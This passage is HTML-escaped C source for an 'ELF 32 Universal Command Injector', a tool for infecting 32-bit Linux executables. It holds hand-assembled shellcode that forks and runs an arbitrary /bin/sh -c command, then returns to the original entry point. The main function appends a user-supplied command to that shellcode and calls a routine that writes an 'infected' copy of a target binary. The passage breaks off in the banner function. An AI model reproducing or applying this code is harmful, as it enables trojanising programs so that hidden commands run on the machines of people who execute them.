Foundation; either version 2 of the License, or\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      (at your option) any later version.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      This program is distributed in the hope that it will be useful,\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      but WITHOUT ANY WARRANTY; without even the implied warranty of\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      GNU General Public License for more details.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      You should have received a copy of the GNU General Public License\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      along with this program; if not, write to the Free Software\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      MA 02110-1301, USA.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;sys/stat.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;sys/types.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;fcntl.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;errno.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e#\u003cspan class=\"meta-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"meta-string\"\u003e\u0026lt;elf.h\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003etypedef\u003c/span\u003e \u003cspan class=\"class\"\u003e\u003cspan class=\"keyword\"\u003estruct\u003c/span\u003e {\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e srcfile[\u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e];\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e dstfile[\u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e];\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e command[\u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e];\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e  verbose;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eparams_t\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eextern\u003c/span\u003e \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e errno;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einjector_banner\u003c/span\u003e     \u003cspan class=\"params\"\u003e()\u003c/span\u003e\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einjector_usage\u003c/span\u003e      \u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *argvz )\u003c/span\u003e\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einject_elf_code\u003c/span\u003e     \u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *sourcefile, \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *infectedfile, \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *asm_payload, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e asm_len, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e asm_reentry_offset )\u003c/span\u003e\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003eint\u003c/span\u003e  \u003cspan class=\"title\"\u003efind_reentry_offset\u003c/span\u003e \u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *code, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e size )\u003c/span\u003e\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003edump_hex\u003c/span\u003e            \u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *buff, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e offset, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e n )\u003c/span\u003e\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"title\"\u003emain\u003c/span\u003e\u003cspan class=\"params\"\u003e(\u003cspan class=\"keyword\"\u003eint\u003c/span\u003e argc,\u003cspan class=\"keyword\"\u003echar\u003c/span\u003e **argv)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e i;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        injector_banner();\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( argc \u0026lt; \u003cspan class=\"number\"\u003e6\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                injector_usage(strdup(argv[\u003cspan class=\"number\"\u003e0\u003c/span\u003e]));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"number\"\u003e-1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eparams_t\u003c/span\u003e params;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003ememset\u003c/span\u003e( \u0026amp;params, \u003cspan class=\"number\"\u003e0\u003c/span\u003e, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(params) );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e c;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ewhile\u003c/span\u003e( (c = getopt(argc,argv,\u003cspan class=\"string\"\u003e\u0026#34;s:d:c:\u0026#34;\u003c/span\u003e)) != \u003cspan class=\"number\"\u003e-1\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eswitch\u003c/span\u003e(c){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#39;s\u0026#39;\u003c/span\u003e : \u003cspan class=\"built_in\"\u003estrncpy\u003c/span\u003e( params.srcfile ,optarg, \u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e ); \u003cspan class=\"keyword\"\u003ebreak\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#39;d\u0026#39;\u003c/span\u003e : \u003cspan class=\"built_in\"\u003estrncpy\u003c/span\u003e( params.dstfile ,optarg, \u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e ); \u003cspan class=\"keyword\"\u003ebreak\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e : \u003cspan class=\"built_in\"\u003estrncpy\u003c/span\u003e( params.command ,optarg, \u003cspan class=\"number\"\u003e0xFF\u003c/span\u003e ); \u003cspan class=\"keyword\"\u003ebreak\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003edefault\u003c/span\u003e  : injector_usage(strdup(argv[\u003cspan class=\"number\"\u003e0\u003c/span\u003e]));         \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"number\"\u003e-1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* General purpose shell code that simulates :\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *              fork()\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *              if( child_process ){\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *                      system( \u0026#39;command\u0026#39; )\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *              }\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 * by BlackLight\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e asm_base_payload[] =\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x60\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*pusha*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         \u003cspan class=\"comment\"\u003e/* fork */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xb8\\x02\\x00\\x00\\x00\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*mov    $0x2,%eax*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xcd\\x80\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*int    $0x80*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x83\\xf8\\x00\u0026#34;\u003c/span\u003e               \u003cspan class=\"comment\"\u003e/*cmp    $0x0,%eax*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x75\\x25\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*jne   80483a6 \u0026lt;end\u0026gt;*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         \u003cspan class=\"comment\"\u003e/* child process: execl (\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,cmd); */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xb8\\x0b\\x00\\x00\\x00\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*mov    $0xb,%eax*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x31\\xd2\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*xor    %edx,%edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x52\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x68\\x6e\\x2f\\x73\\x68\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*push   $0x68732f6e*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x68\\x2f\\x2f\\x62\\x69\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*push   $0x69622f2f*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x89\\xe3\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*mov    %esp,%ebx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x52\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x68\\x2d\\x63\\x63\\x63\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*push   $0x6363632d*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x89\\xe1\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*mov    %esp,%ecx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x52\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xeb\\x22\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*jmp   80483c2 \u0026lt;cmd\u0026gt;*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x51\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %ecx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x53\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %ebx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x89\\xe1\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*mov    %esp,%ecx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xcd\\x80\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*int    $0x80*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         \u003cspan class=\"comment\"\u003e/* parent process: waitpid (-1,NULL,0); */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x31\\xd2\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*xor    %edx,%edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xb8\\x07\\x00\\x00\\x00\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*mov    $0x7,%eax*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xbb\\xff\\xff\\xff\\xff\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*mov    $0xffffffff,%ebx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x52\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*push   %edx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x89\\xe1\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*mov    %esp,%ecx*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xcd\\x80\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*int    $0x80*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x83\\xc4\\x04\u0026#34;\u003c/span\u003e               \u003cspan class=\"comment\"\u003e/*add    $0x4,%esp*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         \u003cspan class=\"comment\"\u003e/* this prepares the overwriting by the address of entry point */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\x61\u0026#34;\u003c/span\u003e                       \u003cspan class=\"comment\"\u003e/*popa*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xbd\\x00\\x00\\x00\\x00\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*mov    $0x0,%ebp*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xff\\xe5\u0026#34;\u003c/span\u003e                   \u003cspan class=\"comment\"\u003e/*jmp    *%ebp*/\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         \u003cspan class=\"comment\"\u003e/* string label; here the command will be appended */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#34;\\xe8\\xd9\\xff\\xff\\xff\u0026#34;\u003c/span\u003e       \u003cspan class=\"comment\"\u003e/*call  80483a0 \u0026lt;l1\u0026gt;*/\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e   cmd_len     = \u003cspan class=\"built_in\"\u003estrlen\u003c/span\u003e(params.command),\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e              base_size   = \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(asm_base_payload) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* alloc space for base shellcode + user command */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *asm_payload = (\u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *)\u003cspan class=\"built_in\"\u003emalloc\u003c/span\u003e( base_size + cmd_len );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* asm_payload = asm_base_payload + params.command */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003ememcpy\u003c/span\u003e( asm_payload, asm_base_payload, base_size );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003ememcpy\u003c/span\u003e( asm_payload + base_size, params.command, cmd_len );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* compute total payload size and \u0026#39;jmp \u0026lt;original_elf_entrypoint\u0026gt;\u0026#39; shellcode offset */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e  asm_payload_size   = base_size + cmd_len,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e             asm_reentry_offset = find_reentry_offset( asm_payload, asm_payload_size );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ Shellcode size               : %d bytes .\\n\u0026#34;\u003c/span\u003e, asm_payload_size );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* do injection */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        inject_elf_code( params.srcfile, params.dstfile, asm_payload, asm_payload_size, asm_reentry_offset );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"number\"\u003e0\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einjector_banner\u003c/span\u003e\u003cspan class=\"params\"\u003e()\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;************************************************************\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                \u003cspan class=\"string\"\u003e\u0026#34;*         -[ ELF 32 Universal Command Injector ]-          *\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                \u003cspan class=\"string\"\u003e\u0026#34;*                                                          *\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                \u003cspan class=\"string\"\u003e\u0026#34;*              by evilsocket and BlackLight                *\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                \u003cspan class=\"string\"\u003e\u0026#34;* http://www.evilsocket.net - http://blacklight.gotdns.org *\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                \u003cspan 